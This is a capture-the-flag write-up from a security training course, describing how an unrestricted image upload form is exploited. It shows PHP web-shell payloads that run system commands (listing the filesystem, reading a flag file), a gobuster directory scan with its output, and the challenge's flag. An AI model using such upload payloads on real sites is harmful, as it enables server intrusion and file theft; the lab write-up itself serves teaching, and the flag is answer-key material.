---
Name: "Meme uploader"
Category: "Security Summer School"
Difficulty: "Medium"
Description: "Investigating a vulnerable upload workflow to obtain code execution."
---

# Meme uploader
We can upload memes, trying with a regulat jpg file works fine, now let's try with a php file
```php
<?php echo system("ls / -alR"); ?>
```

This works too 

![ls](../../../public/images/security_summer_school/08_exotic_attacks/meme_uploader.png)

Running gobuster helps us find the /uploads directory
```bash
gobuster dir -u http://sss.upb:8003 -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 50 -x txt,php,html,bak,zip,log -k
```
```bash
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://141.85.224.102:8003
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              zip,log,txt,php,html,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 886]
uploads              (Status: 301) [Size: 325] [--> http://sss.upb/uploads/]
```

Going to http://sss.upb:8003/uploads/8776045f2e7874ebe20d1dfea50c9735.php reveals the flag location
```txt
/var/www/html:
total 28
drwxrwxrwx 1 www-data www-data 4096 Jul 16 08:34 .
drwxr-xr-x 1 root     root     4096 Dec 11  2020 ..
-rw-r--r-- 1 root     root       40 Jun 25 14:22 flag.txt
-rw-r--r-- 1 root     root     2125 Jun 25 14:22 index.php
drwxrwxrwx 1 root     root     4096 Jul 16 09:58 uploads
```

Now let's read it by repeating the steps with a new payload
```php
<?php echo system("cat /var/www/html/flag.txt"); ?>
```

```txt
SSS{at_l3ast_ch3ck_f0r_3xt3nsi0ns_n00b} 
```

